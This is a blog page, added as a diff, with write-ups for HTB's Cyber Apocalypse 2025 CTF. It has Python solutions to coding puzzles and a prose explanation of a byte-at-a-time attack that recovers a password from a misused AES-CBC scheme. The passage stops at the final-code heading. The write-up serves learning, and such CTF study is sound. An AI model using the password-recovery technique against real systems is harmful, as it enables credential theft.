@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Cyber Apocalypse 2025 | pshegger&#39;s blog</title>
+<meta name="keywords" content="ctf, writeup, cryptography, python, forensics, reversing, template injection">
+<meta name="description" content="Writeups from HTB&#39;s Cyber Apocalypse CTF 2025: Tales from Eldoria">
+<meta name="author" content="pshegger">
+<link rel="canonical" href="https://pshegger.github.io/posts/cyber-apocalypse-2025/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css" integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF&#43;13Dyqob6ASlTrTye8=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://pshegger.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://pshegger.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://pshegger.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://pshegger.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://pshegger.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://pshegger.github.io/posts/cyber-apocalypse-2025/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://pshegger.github.io/" accesskey="h" title="pshegger&#39;s blog (Alt + H)">pshegger&#39;s blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://pshegger.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://pshegger.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Cyber Apocalypse 2025
+    </h1>
+    <div class="post-description">
+      Writeups from HTB&#39;s Cyber Apocalypse CTF 2025: Tales from Eldoria
+    </div>
+    <div class="post-meta"><span title='2025-04-16 00:00:00 +0000 UTC'>April 16, 2025</span>&nbsp;·&nbsp;17 min&nbsp;·&nbsp;pshegger
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#coding" aria-label="Coding">Coding</a><ul>
+                        
+                <li>
+                    <a href="#summoners-incantation" aria-label="Summoners Incantation">Summoners Incantation</a></li>
+                <li>
+                    <a href="#dragon-fury" aria-label="Dragon Fury">Dragon Fury</a></li>
+                <li>
+                    <a href="#enchanted-cipher" aria-label="Enchanted Cipher">Enchanted Cipher</a></li>
+                <li>
+                    <a href="#dragon-flight" aria-label="Dragon Flight">Dragon Flight</a></li>
+                <li>
+                    <a href="#clockwork-guardian" aria-label="ClockWork Guardian">ClockWork Guardian</a></li></ul>
+                </li>
+                <li>
+                    <a href="#crypto" aria-label="Crypto">Crypto</a><ul>
+                        
+                <li>
+                    <a href="#hourcle" aria-label="Hourcle">Hourcle</a><ul>
+                        
+                <li>
+                    <a href="#attack-explanation" aria-label="Attack Explanation">Attack Explanation</a></li>
+                <li>
+                    <a href="#implications-of-this-attack" aria-label="Implications of this Attack">Implications of this Attack</a></li>
+                <li>
+                    <a href="#final-code" aria-label="Final Code">Final Code</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#forensics" aria-label="Forensics">Forensics</a><ul>
+                        
+                <li>
+                    <a href="#thorins-amulet" aria-label="Thorin&rsquo;s Amulet">Thorin&rsquo;s Amulet</a><ul>
+                        
+                <li>
+                    <a href="#stage-1" aria-label="Stage 1">Stage 1</a></li>
+                <li>
+                    <a href="#stage-2" aria-label="Stage 2">Stage 2</a></li>
+                <li>
+                    <a href="#stage-3" aria-label="Stage 3">Stage 3</a></li></ul>
+                </li>
+                <li>
+                    <a href="#a-new-hire" aria-label="A New Hire">A New Hire</a><ul>
+                        
+                <li>
+                    <a href="#stage-1-1" aria-label="Stage 1">Stage 1</a></li>
+                <li>
+                    <a href="#stage-2-1" aria-label="Stage 2">Stage 2</a></li>
+                <li>
+                    <a href="#stage-3-1" aria-label="Stage 3">Stage 3</a></li></ul>
+                </li>
+                <li>
+                    <a href="#silent-trap" aria-label="Silent Trap">Silent Trap</a><ul>
+                        
+                <li>
+                    <a href="#flag-1" aria-label="Flag 1">Flag 1</a></li>
+                <li>
+                    <a href="#flag-2" aria-label="Flag 2">Flag 2</a></li>
+                <li>
+                    <a href="#flag-3" aria-label="Flag 3">Flag 3</a></li>
+                <li>
+                    <a href="#flag-4" aria-label="Flag 4">Flag 4</a></li>
+                <li>
+                    <a href="#flag-5" aria-label="Flag 5">Flag 5</a></li>
+                <li>
+                    <a href="#flag-6" aria-label="Flag 6">Flag 6</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#reversing" aria-label="Reversing">Reversing</a><ul>
+                        
+                <li>
+                    <a href="#sealedrune" aria-label="SealedRune">SealedRune</a></li>
+                <li>
+                    <a href="#encryptedscroll" aria-label="EncryptedScroll">EncryptedScroll</a></li></ul>
+                </li>
+                <li>
+                    <a href="#web" aria-label="Web">Web</a><ul>
+                        
+                <li>
+                    <a href="#trial-by-fire" aria-label="Trial by Fire">Trial by Fire</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="coding">Coding<a hidden class="anchor" aria-hidden="true" href="#coding">#</a></h1>
+<h2 id="summoners-incantation">Summoners Incantation<a hidden class="anchor" aria-hidden="true" href="#summoners-incantation">#</a></h2>
+<p>It is a fairly simple task. The aim is to choose a number of <code>tokens</code> with the maximum possible sum. The twist is that we cannot use a token next to one that we&rsquo;ve already chosen.</p>
+<p>To solve it, we can create a recursive search with the following constraints:</p>
+<ol>
+<li>if there are no tokens left, the max sum is <code>0</code></li>
+<li>if there&rsquo;s one token left, the max sum is the value of that token</li>
+<li>otherwise, we can check the first two tokens to decide which one we should use
+<ul>
+<li>we take the <code>1st</code> one and call the recursive function with the remaining ones (making sure to remove the <code>2nd</code> token, since that&rsquo;s the neighbor we cannot use)</li>
+<li>repeat previous step with the <code>2nd</code> token; now we have to remove the <code>1st</code> and <code>3rd</code> tokens</li>
+<li>choose the one that has the higher sum</li>
+</ul>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_max_energy</span>(tokens):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(tokens) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> len(tokens) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> tokens[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    e1 <span style="color:#f92672">=</span> tokens[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> find_max_energy(tokens[<span style="color:#ae81ff">2</span>:])
+</span></span><span style="display:flex;"><span>    e2 <span style="color:#f92672">=</span> tokens[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> find_max_energy(tokens[<span style="color:#ae81ff">3</span>:])
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> max(e1, e2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>input_text <span style="color:#f92672">=</span> input()
+</span></span><span style="display:flex;"><span>tokens <span style="color:#f92672">=</span> [int(t) <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> input_text[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;,&#39;</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(find_max_energy(tokens))
+</span></span></code></pre></div><h2 id="dragon-fury">Dragon Fury<a hidden class="anchor" aria-hidden="true" href="#dragon-fury">#</a></h2>
+<p>For this task, we get a <code>2d array</code> that contains possible &ldquo;damage values&rdquo; for rounds, and a <code>target</code> we need to reach. Our aim is to select a single value for each round in a way that adds up to our target in the end.</p>
+<p>We can once again use a recursive search to itarate over all possible combinations. For the first <code>n-1</code> rounds, we can simply take all the possible values, and call our function with that round removed from the list of rounds. In the last round we have to check whether the possible values contain the remaining target. If it does, we have our solution, otherwise, we can backtrack to a previous state to try that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_damages</span>(damages, target):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(damages) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> len(damages) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> target <span style="color:#f92672">in</span> damages[<span style="color:#ae81ff">0</span>]:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> [target]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(damages[<span style="color:#ae81ff">0</span>])):
+</span></span><span style="display:flex;"><span>        dmg <span style="color:#f92672">=</span> damages[<span style="color:#ae81ff">0</span>][i]
+</span></span><span style="display:flex;"><span>        trial <span style="color:#f92672">=</span> find_damages(damages[<span style="color:#ae81ff">1</span>:], target <span style="color:#f92672">-</span> dmg)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(trial) <span style="color:#f92672">==</span> len(damages) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> [dmg] <span style="color:#f92672">+</span> trial
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>input_text <span style="color:#f92672">=</span> input()
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> int(input())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>damages <span style="color:#f92672">=</span> eval(input_text)
+</span></span><span style="display:flex;"><span>print(find_damages(damages, target))
+</span></span></code></pre></div><h2 id="enchanted-cipher">Enchanted Cipher<a hidden class="anchor" aria-hidden="true" href="#enchanted-cipher">#</a></h2>
+<p>This task is a weird version of <code>rot13</code>. Here&rsquo;s how it works:</p>
+<ul>
+<li>the input is split into 5-character-long groups</li>
+<li>a random shift amount (<code>1</code>-<code>25</code>) is selected for each group</li>
+<li>the characters in a given group are shifted by the selected amount</li>
+</ul>
+<p>Knowing only this, it could be a challenge to decrypt the message, but we also get the <code>random shifts</code> as our input. That knowledge makes this task trivial. All we have to do is iterate over the characters, deciding which group it belongs to, and shifting it back by the known amount.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shift_back</span>(ch, s):
+</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> ord(ch) <span style="color:#f92672">-</span> s
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> n <span style="color:#f92672">&lt;</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>):
+</span></span><span style="display:flex;"><span>        n <span style="color:#f92672">+=</span> <span style="color:#ae81ff">26</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> chr(n)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>encrypted <span style="color:#f92672">=</span> input()
+</span></span><span style="display:flex;"><span>groups <span style="color:#f92672">=</span> int(input())
+</span></span><span style="display:flex;"><span>shifts <span style="color:#f92672">=</span> eval(input())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ctr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>decrypted <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ch <span style="color:#f92672">in</span> encrypted:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ord(<span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">&lt;=</span> ord(ch) <span style="color:#f92672">&lt;=</span> ord(<span style="color:#e6db74">&#39;z&#39;</span>):
+</span></span><span style="display:flex;"><span>        decrypted <span style="color:#f92672">+=</span> shift_back(ch, shifts[ctr <span style="color:#f92672">//</span> <span style="color:#ae81ff">5</span>])
+</span></span><span style="display:flex;"><span>        ctr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        decrypted <span style="color:#f92672">+=</span> ch
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(decrypted)
+</span></span></code></pre></div><h2 id="dragon-flight">Dragon Flight<a hidden class="anchor" aria-hidden="true" href="#dragon-flight">#</a></h2>
+<p>For this task, we need to do 3 things:</p>
+<ol>
+<li>keep a list of wind effects for each path segment</li>
+<li>update the list when we get a command starting with <code>U</code></li>
+<li>print the <a href="https://en.wikipedia.org/wiki/Maximum_subarray_problem">maximum subarray</a> for the given segments (command <code>Q</code>)</li>
+</ol>
+<p>Since the inputs are really small, we can simply brute-force the max sum.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>n, q <span style="color:#f92672">=</span> [int(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> input()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)]
+</span></span><span style="display:flex;"><span>wind <span style="color:#f92672">=</span> [int(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> input()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(q):
+</span></span><span style="display:flex;"><span>    inp <span style="color:#f92672">=</span> input()
+</span></span><span style="display:flex;"><span>    o, p1, p2 <span style="color:#f92672">=</span> inp<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+</span></span><span style="display:flex;"><span>    p1 <span style="color:#f92672">=</span> int(p1)
+</span></span><span style="display:flex;"><span>    p2 <span style="color:#f92672">=</span> int(p2)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> o <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;U&#39;</span>:
+</span></span><span style="display:flex;"><span>        wind[p1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> p2
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> o <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Q&#39;</span>:
+</span></span><span style="display:flex;"><span>        m <span style="color:#f92672">=</span> wind[p1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(p1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, p2):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(j, p2):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> sum(wind[j:k<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]) <span style="color:#f92672">&gt;</span> m:
+</span></span><span style="display:flex;"><span>                    m <span style="color:#f92672">=</span> sum(wind[j:k<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>        print(m)
+</span></span></code></pre></div><h2 id="clockwork-guardian">ClockWork Guardian<a hidden class="anchor" aria-hidden="true" href="#clockwork-guardian">#</a></h2>
+<p>Classic path-finding task. We need to get from the start position (<code>(0,0)</code>) to the exit (marked with <code>E</code>) while avoiding the sentinels (marked with <code>1</code>). We can simply implement <a href="https://en.wikipedia.org/wiki/Dijkstra%27s_algorithm">Dijkstra&rsquo;s Algorithm</a>, to determine the distance of any point from the start. Once we have the distances, we just have to find the exit and print the value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>input_text <span style="color:#f92672">=</span> input()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">are_neighbors</span>(u, v):
+</span></span><span style="display:flex;"><span>    horizontal <span style="color:#f92672">=</span> (u[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> v[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">or</span> u[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> v[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">and</span> u[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> v[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    vertical <span style="color:#f92672">=</span> (u[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> v[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">or</span> u[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> v[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">and</span> u[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> v[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> horizontal <span style="color:#f92672">or</span> vertical
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dijkstra</span>(maze, start):
+</span></span><span style="display:flex;"><span>    dist <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>    prev <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>    q <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(len(maze)):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(len(maze[y])):
+</span></span><span style="display:flex;"><span>            dist[(x, y)] <span style="color:#f92672">=</span> <span style="color:#ae81ff">10000</span>
+</span></span><span style="display:flex;"><span>            prev[(x, y)] <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> maze[y][x] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>                q<span style="color:#f92672">.</span>append((x, y))
+</span></span><span style="display:flex;"><span>    dist[start] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> len(q) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        u <span style="color:#f92672">=</span> q[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> v <span style="color:#f92672">in</span> q:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> dist[v] <span style="color:#f92672">&lt;</span> dist[u]:
+</span></span><span style="display:flex;"><span>                u <span style="color:#f92672">=</span> v
+</span></span><span style="display:flex;"><span>        q<span style="color:#f92672">.</span>remove(u)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> v <span style="color:#f92672">in</span> q:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> are_neighbors(u, v):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            alt <span style="color:#f92672">=</span> dist[u] <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> alt <span style="color:#f92672">&lt;</span> dist[v]:
+</span></span><span style="display:flex;"><span>                dist[v] <span style="color:#f92672">=</span> alt
+</span></span><span style="display:flex;"><span>                prev[v] <span style="color:#f92672">=</span> u
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> dist, prev
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>maze <span style="color:#f92672">=</span> eval(input_text)
+</span></span><span style="display:flex;"><span>dist, prev <span style="color:#f92672">=</span> dijkstra(maze, (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(len(maze)):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(len(maze[<span style="color:#ae81ff">0</span>])):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> maze[y][x] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;E&#39;</span>:
+</span></span><span style="display:flex;"><span>            print(dist[(x, y)])
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span></code></pre></div><h1 id="crypto">Crypto<a hidden class="anchor" aria-hidden="true" href="#crypto">#</a></h1>
+<h2 id="hourcle">Hourcle<a hidden class="anchor" aria-hidden="true" href="#hourcle">#</a></h2>
+<p>Since we get access to the source code of the encryption, we can check how the encryption is implemented.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt_creds</span>(user):
+</span></span><span style="display:flex;"><span>    padded <span style="color:#f92672">=</span> pad((user <span style="color:#f92672">+</span> password)<span style="color:#f92672">.</span>encode(), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    IV <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(KEY, AES<span style="color:#f92672">.</span>MODE_CBC, iv<span style="color:#f92672">=</span>IV)
+</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(padded)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ciphertext
+</span></span></code></pre></div><p>Looking at the <code>encrypt_creds</code> function, we can see two issues:</p>
+<ol>
+<li>the unknown <code>password</code> is concatenated to the user-provided <code>username</code></li>
+<li>it uses the <code>decrypt</code> method instead of <code>encrypt</code></li>
+</ol>
+<p>The consequences become obvious once we check the difference between <code>decrypt</code> and <code>encrypt</code> (<a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)">CBC on Wikipedia</a>): the last step of decryption is a <code>xor</code> operation, and it uses the previous block as one of the operands. Since we can control (part of) the input, we can freely select this block by using a carefully crafted input.</p>
+<p>To recover the password, we need to construct our <code>username</code> in a way, that will result in a part of it being the same as the end, where the password is automatically appended.</p>
+<h3 id="attack-explanation">Attack Explanation<a hidden class="anchor" aria-hidden="true" href="#attack-explanation">#</a></h3>
+<p>Let&rsquo;s see an example with a shorter password (<code>4</code> characters) and block size (<code>8</code> bytes): <code>00000000 0000000c 00000000 0000000p ppp_____</code>. This is the result of the following:</p>
+<ul>
+<li>the <code>1st</code> block is a known value (<code>0s</code> in this case, but any value should do)</li>
+<li>the <code>2nd</code> block also starts with known values, but the last character is something different (<code>c</code>)</li>
+<li>the <code>3rd</code> block is the same as the first one</li>
+<li>the <code>4th</code> block begins the same way as our <code>2nd</code>, but ends with the first character of the <code>password</code></li>
+<li>the last block is the remainder of the password (+ some extra padding), but it&rsquo;s not important for us</li>
+</ul>
+<p>Keep in mind, that this is the final, <em>complete</em>, value that will be passed to <code>cipher.decrypt</code>. The <code>username</code> provided by us, actually ends with the last <code>0</code> (just before the first <code>p</code>). So, what does this mean? Let&rsquo;s see, what happens with each block:</p>
+<ul>
+<li><code>1st</code>: decrypted with <code>KEY</code> and <code>xored</code> together with a random <code>IV</code></li>
+<li><code>2nd-5th</code>: decrypted with <code>KEY</code> and <code>xored</code> together with the previous (plain-text) block</li>
+</ul>
+<p>The key is the same for each block, and we made sure that blocks <code>1</code> &amp; <code>3</code> are the same. This means, that the decrypted result for blocks <code>2</code> and <code>4</code> will be the same, if <code>c</code> and <code>p</code> is the same at the end. This means that we can iterate over each possible character (as a value of <code>c</code>) to find the first character of the password. Once we have that, we can just remove a <code>0</code> from the <code>2nd</code> block, do the same with the <code>4th</code> block, and start cracking the <code>2nd</code> character of the password.</p>
+<h3 id="implications-of-this-attack">Implications of this Attack<a hidden class="anchor" aria-hidden="true" href="#implications-of-this-attack">#</a></h3>
+<p>This attack significantly decreases the search space. If we tried to crack the original password, we would&rsquo;ve needed <code>62^20 = 7*10^35</code> tries. Since we&rsquo;re now cracking each character one-by-one, the search space is reduced to <code>62*20 = 1240</code>, making it feasable.</p>
+<h3 id="final-code">Final Code<a hidden class="anchor" aria-hidden="true" href="#final-code">#</a></h3>
